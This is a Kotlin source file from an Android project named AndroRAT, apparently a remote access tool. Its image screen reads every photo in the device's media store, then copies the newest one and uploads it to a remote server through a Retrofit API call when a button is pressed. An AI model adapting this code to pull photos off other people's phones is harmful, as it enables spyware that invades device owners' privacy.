package com.ierusalem.androrat.screens.images

import android.content.ContentUris
import android.os.Bundle
import android.os.Environment
import android.provider.MediaStore
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.compose.runtime.rememberCoroutineScope
import androidx.compose.ui.platform.ComposeView
import androidx.fragment.app.Fragment
import androidx.fragment.app.viewModels
import com.ierusalem.androrat.networking.RetrofitInstance
import com.ierusalem.androrat.screens.home.Image
import com.ierusalem.androrat.ui.theme.AndroRATTheme
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.RequestBody
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.io.FileOutputStream

class ImageFragment : Fragment() {

    private val viewModel by viewModels<ImageViewModel>()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val projection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.AUTHOR,
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.DATA,
            MediaStore.Images.Media.DATE_TAKEN,
            MediaStore.Images.Media.DESCRIPTION
        )
        //selection defines which photos we want to read, null means all of them
        val selection = null
        val selectionArgs = null
        val sortOrder =
            "${MediaStore.Images.Media.DATE_TAKEN} DESC"

        requireContext().contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection,
            selection,
            selectionArgs,
            sortOrder
        )?.use { cursor ->
            val idColumn =
                cursor.getColumnIndex(MediaStore.Images.Media._ID)
            val authorColumn =
                cursor.getColumnIndex(MediaStore.Images.Media.AUTHOR)
            val displayNameColumn =
                cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)
            val dataColumn =
                cursor.getColumnIndex(MediaStore.Images.Media.DATA)
            val dataTakenColumn =
                cursor.getColumnIndex(MediaStore.Images.Media.DATE_TAKEN)
            val descriptionColumn =
                cursor.getColumnIndex(MediaStore.Images.Media.DESCRIPTION)

            val images = mutableListOf<Image>()
            while (cursor.moveToNext()) {
                val id = cursor.getLong(idColumn)
                val author = cursor.getLong(authorColumn)
                val disPlayName =
                    cursor.getString(displayNameColumn)
                val data = cursor.getString(dataColumn)
                val dataTaken =
                    cursor.getLong(dataTakenColumn)
                val description =
                    cursor.getLong(descriptionColumn)

                val uri = ContentUris.withAppendedId(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    id
                )
                images.add(
                    Image(
                        id = id,
                        author = author,
                        displayName = disPlayName,
                        data = data,
                        dataTaken = dataTaken,
                        description = description,
                        uri = uri
                    )
                )
            }
            viewModel.updateImages(images)
        }
    }

    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {
        return ComposeView(requireContext()).apply {
            setContent {
                AndroRATTheme {
                    val scope = rememberCoroutineScope()

                    ImagesScreen(
                        images = viewModel.images,
                        onUploadClick = {
                            val apiService = RetrofitInstance(requireContext()).api
                            val uri = viewModel.images[0].uri
                            val inputStream = requireContext().contentResolver.openInputStream(uri)
                            val image = File.createTempFile(
                                "image",
                                ".jpg",
                                requireActivity().getExternalFilesDir(Environment.DIRECTORY_PICTURES)
                            )
                            val fileOutputStream = FileOutputStream(image)
                            inputStream?.copyTo(fileOutputStream)
                            fileOutputStream.close()

                            val requestBody: RequestBody = MultipartBody.Builder()
                                .setType(MultipartBody.FORM)
                                .addFormDataPart("description", "easy")
                                .addFormDataPart(
                                    "file",
                                    image.name,
                                    image.asRequestBody(
                                        "image/*".toMediaType()
                                    )
                                )
                                .build()

                            scope.launch {
                               val response = apiService.postImage(requestBody)
                                if (response.isSuccessful) {
                                    Log.d(
                                        "ahi3646_photo",
                                        "sendMessages: success - ${response.body()} "
                                    )
                                } else {
                                    Log.d(
                                        "ahi3646_photo",
                                        "sendMessages: failure  - ${response.errorBody()}}"
                                    )
                                }
                            }
                        }
                    )
                }
            }
        }
    }
}
